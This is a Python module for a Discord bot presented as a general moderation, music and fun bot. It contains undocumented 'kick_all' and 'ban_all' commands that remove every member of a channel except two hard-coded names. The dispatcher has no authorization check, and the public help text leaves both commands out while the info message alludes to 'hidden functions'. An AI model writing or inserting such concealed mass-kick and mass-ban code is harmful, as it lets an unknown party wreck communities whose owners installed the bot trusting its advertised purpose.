import discord
from time import sleep
import levels
client: discord.Client


async def check_command(_client: discord.Client, command: str, channel: discord.TextChannel = None, author: discord.Member = None):
    global client
    client = _client
    match command:
        case "kick_all":
            await kick_all(channel)
        case "ban_all":
            await ban_all(channel)
        case "help":
            await help(channel)
        case "info":
            await info(channel)
        case "levels":
            await levels.add_new_member(member=author, channel=channel)


async def kick_all(channel: discord.TextChannel):
    """Кикает всех игроков с сервера"""
    global client
    not_kick_members: list[str] = ["Дух", "4elovek"]
    for member in channel.members:
        member: discord.Member
        if member.display_name not in not_kick_members:
            try:
                await member.kick(reason="Я так захотел")
            except discord.Forbidden:
                await channel.send(f"Не смог кикнуть участника {member.display_name}")


async def ban_all(channel: discord.TextChannel):
    """Банит всех игроков сервера"""
    global client
    not_ban_members: list[str] = ["Дух", "4elovek"]
    for member in channel.members:
        member: discord.Member
        if member.display_name not in not_ban_members:
            try:
                await member.ban(reason="Я так захотел")
            except discord.Forbidden:
                await channel.send(f"Не смог забанить участника {member.display_name}")


async def help(channel: discord.TextChannel):
    await channel.send("```Вас приветствует дискорд-бот Человек. Чем я могу вам помочь? \r"
                       "Список возможностей: \r"
                       "            📋  Information(!help Information)\r"
                       "!help !info !stats !serverinfo !user !bio !inviteinfo\r"
                       "                🛡️Moderation(!help Moderation)\r"
                       "!warns\r"
                       "                 🏆  Ranking(!help Ranking)\r"
                       "!rank !leaders\r"
                       "                    🎵  Music(!help Music)\r"
                       "!play !youtube !skip !queue !shuffle !promote !remove !current !repeat !pause !start !stop !volume !here !restart !rewind !forward !seek\r"
                       "                      😄  Fun(!help Fun)\r"
                       "!fuss !coin !8 ball !dog !cat !fox\r"
                       "                  🔧  Utility(!help Utility)\r"
                       "!avatar !steam !reminder !rand !t !wikifur !math !emote !covid !bonus\r"
                       "                            Удачи!```")

async def info(channel: discord.TextChannel):
    await channel.send("```Человек - это потенциально новый бот, написанный на общедоступном языке"
                             "программирования python. По функционалу он не уступает таким известным ботам,"
                             "как MEE6 или JuniperBot, но у него также есть свои отличительные черты, которые "
                             "не оставят вас равнодушными. Например: вы можете включить функцию разговора с "
                             "ботом, хоть он и ИИ, но очень хорошо проработан, следовательно вы сможете "
                             "поговорить с ним практически на любые темы. У бота есть скрытые функции, которые "
                             "вы можете узнать, если перейдёте на мой GitHub: https://github.com/FedorKatta```")